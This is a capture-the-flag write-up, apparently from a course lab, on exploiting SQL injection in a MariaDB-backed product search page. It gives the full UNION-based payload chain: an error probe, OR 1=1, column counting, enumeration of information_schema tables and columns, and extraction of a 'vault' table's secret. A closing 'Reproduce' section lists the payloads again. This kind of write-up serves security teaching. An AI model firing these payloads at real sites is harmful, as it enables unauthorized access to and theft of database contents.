## On site "<http://sqli2.chal.deti:8031/>" i saw

- A search bar and a button to search
- Some featured Products with the attributes "Part", "Prices", "Notes"

## Method

- I first tried to search in the bar for the "part" attribute of some products and it worked
- Then I tried to search by "price" and by "notes" and it didnt
  - For example there is a Product with "Part": "Bench PSU 12V 5A", "Price": "€18.90", "Notes": "Regulated lab power supply, 12 V at 5 A."
    If I search for "Bench" it shows, but if I search for "18.90" or "Regulated" it doesnt
  - The message for not finding is "Nothing on the shelves matches “18.9”."
- Then I tried to put a " ' " to check the error message and it gave :

```
Search failed: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' ORDER BY id' at line 1")"
```

- This tells me that this page is vulnerable to SQL Injection and it runs on MariaDB
- To test my hypothesis in ran "abc' OR 1=1 -- //" and the output were all the products in the data base

- With this information I can say that the SQL statement is something like

```
SELECT Part, Price, Notes FROM [products_table_name, maybe Products] WHERE Part LIKE 'INPUT'% ORDER BY id
```

- I got the LIKE because when I put "'; --" i get an error like

  ```
  Search failed: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--%' ORDER BY id' at line 1")
  ```

- That tells me there is a % and likely it is used to complete names (if i put just bench it also returns products like Benchmark), I tested and it works like that

- Now I want to go to other parts of the database
- The next step is to get the tables in the DB so i ran "' UNION SELECT * FROM information_schema.tables -- //" and the output was

```
Search failed: (1222, 'The used SELECT statements have a different number of columns')
```

- This shows that a UNION is possible and I just need to figure out how many elements to get trought to get the info
  - After trying with some eventually i got that I needed 4 elements

- Then I had to figure out the type of each collumn to make a UNION attack viable
  - This payload "' UNION SELECT "teste","teste","teste","teste" -- //" gave an error so one of them is not a string
  - Then I tried "' UNION SELECT 1,"teste","teste","teste" -- //" and still gave error, i kept trying putting strings on 3 of the arguments and an integer in one of them until this payload "' UNION SELECT "teste","test",1,"teste" -- //" didnt give an error
  - Now I knew the order I need to get in the Union, "String", "String", Integer, "String"

    - The Integer might be the price (its probably not an integer, but a float, nevertheless its a number)

- I then tried "' UNION SELECT TABLE_NAME, "teste", 1, TABLE_SCHEMA FROM information_schema.tables -- //"
 and the output was things like

```
teste, 1€, app_db
teste, 1€, performance_schema
teste, 1€, information_schema
```

- This led me to know that the first collumn isnt shown (its probably and ID), the second is the part name, the third the price and the fourth the description

- By now adjusting the payload to the information I want to get (other tables in the DB) i got this payload

```
' UNION SELECT "teste", TABLE_NAME, 1, TABLE_SCHEMA FROM information_schema.tables -- //
```

The output of that was

```
| Part                                  | Price  | Notes                                           |
| ------------------------------------- | ------ | ----------------------------------------------- |
| Bench PSU 12V 5A                      | €18.90 | Regulated lab power supply, 12 V at 5 A.        |
| Breadboard, 830 tie                   | €6.40  | Solderless prototype board, 830 contact points. |
| Soldering iron 60W                    | €24.50 | Adjustable-temperature iron with stand.         |
| Flux pen, rosin core                  | €3.20  | No-clean flux for 0.6-1.0 mm joints.            |
| Relay 5V 10A DPDT                     | €2.85  | Signal relay, 5 V coil, 10 A contacts.          |
| Potentiometer 10k linear              | €0.75  | Panel pot, linear taper, 3-pin.                 |
| USB-C breakout board                  | €12.30 | USB-C to USB 2.0 signals, test points.          |
| Terminal block 4-way                  | €1.10  | Screw clamp, 4 positions, 21 AWG.               |
| Capacitor kit, 100 pcs                | €14.95 | Ceramic and film values, 0.1 uF to 47 uF.       |
| Multimeter, true RMS                  | €42.00 | Digital multimeter, 6000 counts, RMS.           |
| Cable gland M20                       | €0.95  | Nylon gland, M20 x 1.5, IP66.                   |
| Heat shrink, 2:1 set                  | €8.60  | Assorted ratios and colours, 200 pieces.        |
| ALL_PLUGINS                           | €1.00  | information_schema                              |
| APPLICABLE_ROLES                      | €1.00  | information_schema                              |
| CHARACTER_SETS                        | €1.00  | information_schema                              |
| CHECK_CONSTRAINTS                     | €1.00  | information_schema                              |
| COLLATIONS                            | €1.00  | information_schema                              |
| COLLATION_CHARACTER_SET_APPLICABILITY | €1.00  | information_schema                              |
| COLUMNS                               | €1.00  | information_schema                              |
| COLUMN_PRIVILEGES                     | €1.00  | information_schema                              |
| ENABLED_ROLES                         | €1.00  | information_schema                              |
| ENGINES                               | €1.00  | information_schema                              |
| EVENTS                                | €1.00  | information_schema                              |
| FILES                                 | €1.00  | information_schema                              |
| GLOBAL_STATUS                         | €1.00  | information_schema                              |
| GLOBAL_VARIABLES                      | €1.00  | information_schema                              |
| KEYWORDS                              | €1.00  | information_schema                              |
| KEY_CACHES                            | €1.00  | information_schema                              |
| KEY_COLUMN_USAGE                      | €1.00  | information_schema                              |
| KEY_PERIOD_USAGE                      | €1.00  | information_schema                              |
| OPTIMIZER_COSTS                       | €1.00  | information_schema                              |
| OPTIMIZER_TRACE                       | €1.00  | information_schema                              |
| PARAMETERS                            | €1.00  | information_schema                              |
| PARTITIONS                            | €1.00  | information_schema                              |
| PERIODS                               | €1.00  | information_schema                              |
| PLUGINS                               | €1.00  | information_schema                              |
| PROCESSLIST                           | €1.00  | information_schema                              |
| PROFILING                             | €1.00  | information_schema                              |
| REFERENTIAL_CONSTRAINTS               | €1.00  | information_schema                              |
| ROUTINES                              | €1.00  | information_schema                              |
| SCHEMATA                              | €1.00  | information_schema                              |
| SCHEMA_PRIVILEGES                     | €1.00  | information_schema                              |
| SEQUENCES                             | €1.00  | information_schema                              |
| SESSION_STATUS                        | €1.00  | information_schema                              |
| SESSION_VARIABLES                     | €1.00  | information_schema                              |
| STATISTICS                            | €1.00  | information_schema                              |
| SQL_FUNCTIONS                         | €1.00  | information_schema                              |
| SYSTEM_VARIABLES                      | €1.00  | information_schema                              |
| TABLES                                | €1.00  | information_schema                              |
| TABLESPACES                           | €1.00  | information_schema                              |
| TABLE_CONSTRAINTS                     | €1.00  | information_schema                              |
| TABLE_PRIVILEGES                      | €1.00  | information_schema                              |
| TRIGGERS                              | €1.00  | information_schema                              |
| USERS                                 | €1.00  | information_schema                              |
| USER_PRIVILEGES                       | €1.00  | information_schema                              |
| VIEWS                                 | €1.00  | information_schema                              |
| SLAVE_STATUS                          | €1.00  | information_schema                              |
| CLIENT_STATISTICS                     | €1.00  | information_schema                              |
| INDEX_STATISTICS                      | €1.00  | information_schema                              |
| INNODB_FT_CONFIG                      | €1.00  | information_schema                              |
| GEOMETRY_COLUMNS                      | €1.00  | information_schema                              |
| INNODB_SYS_TABLESTATS                 | €1.00  | information_schema                              |
| SPATIAL_REF_SYS                       | €1.00  | information_schema                              |
| USER_STATISTICS                       | €1.00  | information_schema                              |
| INNODB_TRX                            | €1.00  | information_schema                              |
| INNODB_CMP_PER_INDEX                  | €1.00  | information_schema                              |
| INNODB_METRICS                        | €1.00  | information_schema                              |
| INNODB_FT_DELETED                     | €1.00  | information_schema                              |
| INNODB_CMP                            | €1.00  | information_schema                              |
| INNODB_CMP_RESET                      | €1.00  | information_schema                              |
| THREAD_POOL_WAITS                     | €1.00  | information_schema                              |
| THREAD_POOL_QUEUES                    | €1.00  | information_schema                              |
| TABLE_STATISTICS                      | €1.00  | information_schema                              |
| INNODB_SYS_FIELDS                     | €1.00  | information_schema                              |
| INNODB_BUFFER_PAGE_LRU                | €1.00  | information_schema                              |
| INNODB_LOCKS                          | €1.00  | information_schema                              |
| INNODB_FT_INDEX_TABLE                 | €1.00  | information_schema                              |
| INNODB_CMPMEM                         | €1.00  | information_schema                              |
| THREAD_POOL_GROUPS                    | €1.00  | information_schema                              |
| INNODB_SYS_FOREIGN_COLS               | €1.00  | information_schema                              |
| INNODB_BUFFER_POOL_STATS              | €1.00  | information_schema                              |
| INNODB_SYS_FOREIGN                    | €1.00  | information_schema                              |
| INNODB_CMP_PER_INDEX_RESET            | €1.00  | information_schema                              |
| INNODB_FT_INDEX_CACHE                 | €1.00  | information_schema                              |
| INNODB_CMPMEM_RESET                   | €1.00  | information_schema                              |
| INNODB_FT_DEFAULT_STOPWORD            | €1.00  | information_schema                              |
| INNODB_SYS_TABLES                     | €1.00  | information_schema                              |
| INNODB_SYS_COLUMNS                    | €1.00  | information_schema                              |
| INNODB_SYS_TABLESPACES                | €1.00  | information_schema                              |
| INNODB_SYS_INDEXES                    | €1.00  | information_schema                              |
| INNODB_BUFFER_PAGE                    | €1.00  | information_schema                              |
| INNODB_SYS_VIRTUAL                    | €1.00  | information_schema                              |
| user_variables                        | €1.00  | information_schema                              |
| INNODB_TABLESPACES_ENCRYPTION         | €1.00  | information_schema                              |
| INNODB_LOCK_WAITS                     | €1.00  | information_schema                              |
| THREAD_POOL_STATS                     | €1.00  | information_schema                              |
| vault                                 | €1.00  | appdb                                           |
| products                              | €1.00  | appdb                                           |
| global_status                         | €1.00  | performance_schema                              |
| session_account_connect_attrs         | €1.00  | performance_schema                              |
| session_status                        | €1.00  | performance_schema                              |
```

- The tables is the "performance_schema" and "information_schema" I assume are created by MariaDB while the ones is "appdb" are created by the owner of the system we are attacking
- The one that sounds more interesting is the vault one
- I will now try to get information on that one
  - For this I will explore the table "COLLUMNS" that i got from my last payload
  - To get information I searched how that table worked in MariaDB and to test i wrote this payload

  ```
  ' UNION SELECT "teste", COLUMN_NAME, 1, "1" FROM information_schema.COLUMNS -- //
  ```

  - This gave every single collumn that exists in the database, now i just need to add a where to get the collumns from the vault table
  - I then did this payload

  ```
  ' UNION SELECT "teste", COLUMN_NAME, 1, "1" FROM information_schema.COLUMNS WHERE TABLE_NAME='vault' -- //
  ```

  - The output was every item and then at the end

  ```
  item €1.00 1
  secret €1.00 1
  ```

  - That "secret" looks interesting i want to get its value
  - To do that I used this payload

  ```
  ' UNION SELECT "teste", item, 1, secret FROM vault -- //
  ```

  - And i got output all the itens and then

  ```
  back-room €1.00 flag{ec3358c6cce5f85a0c1fb1baee757053}
  ```

  - The flag was found

## Reproduce

- Go to search bar and put there

```
' UNION SELECT "teste", TABLE_NAME, 1, TABLE_SCHEMA FROM information_schema.tables -- //
```

- From there get the name of the vault table (should be vault)

- Then put on the bar this to get the collumns of the vault table

```
  ' UNION SELECT "teste", COLUMN_NAME, 1, "1" FROM information_schema.COLUMNS WHERE TABLE_NAME='vault' -- //
```

- Then to get the secret put this:

```
  ' UNION SELECT "teste", item, 1, secret FROM vault -- //
```
